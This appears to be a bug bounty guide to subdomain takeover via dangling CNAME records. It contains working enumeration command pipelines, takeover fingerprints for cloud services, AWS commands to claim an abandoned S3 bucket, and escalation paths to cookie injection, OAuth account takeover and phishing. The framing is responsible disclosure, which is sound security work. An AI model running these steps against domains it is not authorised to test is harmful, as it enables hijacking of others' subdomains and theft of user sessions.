# Subdomain Takeover: CNAME Chain Exploitation

## The Recon Pipeline

```bash
# Phase 1: Enumerate all subdomains
subfinder -d target.com -all -silent | tee subs.txt
amass enum -passive -d target.com -silent >> subs.txt
assetfinder --subs-only target.com >> subs.txt

# Phase 2: Extract CNAME records only
cat subs.txt | dnsx -cname -resp-only -silent | awk '{print $1" "$2}' | sort -u > cnames.txt

# Phase 3: Check for NXDOMAIN on CNAME target
while read sub cname; do
  if ! dig +short "$cname" | grep -q .; then
    echo "DANGLING: $sub -> $cname"
  fi
done < cnames.txt

# Phase 4: HTTP fingerprinting for takeover-able services
cat dangling.txt | httpx -silent -status-code -follow-redirects | grep -v "200"
```

## Service-Specific Fingerprints

| Service | Fingerprint |
|---------|------------|
| AWS S3 | `<Code>NoSuchBucket</Code>` |
| Azure App Service | `404 Web Site not found` |
| Azure CDN | NXDOMAIN on `*.azureedge.net` |
| GitHub Pages | `There isn't a GitHub Pages site here.` |
| Heroku | `No such app` |
| Netlify | `Not Found - Request ID:` |
| Fastly | `Fastly error: unknown domain:` |
| Shopify | `Sorry, this shop is currently unavailable.` |
| Zendesk | `Help Center Closed` |
| Vercel | `The deployment could not be found on Vercel.` |
| ReadTheDocs | `Project doesnt exist... yet!` |

## CNAME Chain Analysis

```bash
# Three-level chain resolution
cname_target=$(dig +short sub.target.com CNAME)
cname_v2=$(dig +short $cname_target CNAME)
cname_v3=$(dig +short $cname_v2 CNAME)
```

Case study: `docs.target.com -> target.readthedocs.io -> readthedocs.io`
The middle hop (target.readthedocs.io) went NXDOMAIN after migration to a new docs platform. The subdomain was claimable for $8,000.

## AWS-Specific Takeovers

### S3 Direct CNAME
```bash
# Target CNAME: assets.target.com -> assets.target.com.s3-website-us-east-1.amazonaws.com
# Create bucket with same name in same region
aws s3api create-bucket --bucket assets.target.com --region us-east-1
aws s3 website s3://assets.target.com/ --index-document index.html
echo "Bug bounty PoC $(date)" | aws s3 cp - s3://assets.target.com/index.html
```

### CloudFront + Deleted S3 Origin
```bash
# CloudFront distribution has CNAME mapped
# Origin S3 bucket was deleted
# Find bucket name from JS bundles or historical DNS
# Recreate the bucket — CloudFront serves from it
```

### Elastic IP Fishing
```bash
# When EC2 is terminated but A record still points to released EIP
# The EIP returns to the pool — allocate IPs until you get the exact one
```

## Reporting & PoC

Create a minimal proof:
1. Register the service with the victim's subdomain
2. Upload a single text file: `poc-[handle]-[date].txt`
3. Content: "This file proves control of this subdomain for responsible disclosure"
4. Screenshot the URL serving the PoC file
5. Delete the resource after the program acknowledges

## Impact Escalation

Check if the subdomain has:
- Cookies set for parent domain (`Domain=.target.com`) → cookie injection
- OAuth redirect URI in scope → silent ATO
- Email (MX) records → SPF bypass for phishing
- CSP directive `connect-src` or `script-src` → CSP bypass
